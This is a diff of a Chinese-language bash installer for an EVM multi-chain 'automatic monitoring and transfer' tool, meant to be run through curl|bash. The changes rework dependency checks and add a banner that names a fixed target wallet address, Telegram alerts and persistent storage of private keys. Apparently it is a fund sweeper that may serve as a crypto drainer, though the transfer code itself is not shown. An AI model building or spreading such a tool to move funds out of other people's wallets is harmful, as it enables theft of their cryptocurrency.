@@ -255,26 +255,82 @@ create_venv() {
     print_info "虚拟环境已激活"
 }
 
-# 安装依赖
+# 智能安装依赖
 install_dependencies() {
-    print_info "安装Python依赖包..."
+    print_info "智能检查和安装Python依赖包..."
     
     # 升级pip
     python -m pip install --upgrade pip
     
-    # 创建requirements.txt
+    # 创建正确的requirements.txt
     cat > requirements.txt << EOF
-web3>=6.0.0
-prompt-toolkit>=3.0.0
+web3>=6.0.0,<7.0.0
 aiosqlite>=0.19.0
 requests>=2.28.0
 python-dotenv>=1.0.0
 eth-account>=0.8.0
-asyncio
+colorama>=0.4.6
 EOF
     
-    # 安装依赖
-    python -m pip install -r requirements.txt
+    # 定义依赖包列表和导入名称的映射
+    declare -A packages_map=(
+        ["web3"]="web3"
+        ["aiosqlite"]="aiosqlite" 
+        ["requests"]="requests"
+        ["python-dotenv"]="dotenv"
+        ["eth-account"]="eth_account"
+        ["colorama"]="colorama"
+    )
+    
+    declare -a missing_packages=()
+    
+    print_info "检查已安装的依赖包..."
+    
+    # 逐个检查依赖
+    for package in "${!packages_map[@]}"; do
+        import_name="${packages_map[$package]}"
+        echo -n "检查 $package... "
+        
+        if python -c "import $import_name" 2>/dev/null; then
+            print_success "✅ 已安装"
+        else
+            print_warning "❌ 缺失"
+            missing_packages+=("$package")
+        fi
+    done
+    
+    # 只安装缺失的依赖
+    if [ ${#missing_packages[@]} -gt 0 ]; then
+        echo ""
+        print_info "安装缺失的依赖包: ${missing_packages[*]}"
+        
+        for package in "${missing_packages[@]}"; do
+            print_info "正在安装 $package..."
+            
+            if [[ "$package" == "web3" ]]; then
+                python -m pip install "web3>=6.0.0,<7.0.0"
+            elif [[ "$package" == "aiosqlite" ]]; then
+                python -m pip install "aiosqlite>=0.19.0"
+            elif [[ "$package" == "requests" ]]; then
+                python -m pip install "requests>=2.28.0"
+            elif [[ "$package" == "python-dotenv" ]]; then
+                python -m pip install "python-dotenv>=1.0.0"
+            elif [[ "$package" == "eth-account" ]]; then
+                python -m pip install "eth-account>=0.8.0"
+            elif [[ "$package" == "colorama" ]]; then
+                python -m pip install "colorama>=0.4.6"
+            fi
+            
+            if [ $? -ne 0 ]; then
+                print_error "$package 安装失败"
+                exit 1
+            else
+                print_success "$package 安装成功"
+            fi
+        done
+    else
+        print_success "✅ 所有依赖都已安装"
+    fi
     
     print_success "依赖包安装完成"
 }
@@ -337,11 +393,11 @@ MAIN_EOF
     if [[ ! -f "requirements.txt" ]]; then
         cat > requirements.txt << 'REQ_EOF'
 web3>=6.0.0,<7.0.0
-prompt-toolkit>=3.0.0
 aiosqlite>=0.19.0
 requests>=2.28.0
 python-dotenv>=1.0.0
 eth-account>=0.8.0
+colorama>=0.4.6
 REQ_EOF
     fi
 }
@@ -542,8 +598,65 @@ start_program() {
         source venv/Scripts/activate
     fi
     
+    # 最终依赖检测（确保colorama等包已安装）
+    print_info "最终依赖检测..."
+    
+    # 定义必需的依赖包
+    declare -A final_packages=(
+        ["aiosqlite"]="aiosqlite"
+        ["web3"]="web3" 
+        ["colorama"]="colorama"
+        ["requests"]="requests"
+        ["python-dotenv"]="dotenv"
+        ["eth-account"]="eth_account"
+    )
+    
+    declare -a final_missing=()
+    
+    # 检查所有依赖
+    for package in "${!final_packages[@]}"; do
+        import_name="${final_packages[$package]}"
+        if ! python -c "import $import_name" 2>/dev/null; then
+            final_missing+=("$package")
+        fi
+    done
+    
+    # 如果有缺失的包，立即安装
+    if [ ${#final_missing[@]} -gt 0 ]; then
+        print_warning "发现缺失的依赖包: ${final_missing[*]}"
+        print_info "正在安装缺失的包..."
+        
+        for package in "${final_missing[@]}"; do
+            print_info "安装 $package..."
+            python -m pip install "$package" --quiet
+            if [ $? -eq 0 ]; then
+                print_success "$package 安装成功"
+            else
+                print_error "$package 安装失败"
+                exit 1
+            fi
+        done
+    else
+        print_success "所有依赖都已就绪"
+    fi
+    
+    # 显示程序信息
+    echo ""
+    echo "=============================================="
+    echo "🚀 EVM多链自动监控转账工具"
+    echo "=============================================="
+    echo "🎯 目标地址: 0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
+    echo "📱 Telegram通知已配置"
+    echo "⚡ 优化速度: 300-500 CU/s"
+    echo "🛡️ 智能Gas优化"
+    echo "💾 私钥持久化存储"
+    echo "🌈 彩色输出界面"
+    echo "=============================================="
+    echo ""
+    
     # 启动程序
     print_success "启动程序中..."
+    
     # 当通过 curl|bash 运行时，stdin/out/err 可能不连接到 TTY，这里重定向到 /dev/tty 以进入交互菜单
     if [[ -e /dev/tty ]]; then
         exec python main.py < /dev/tty > /dev/tty 2>&1
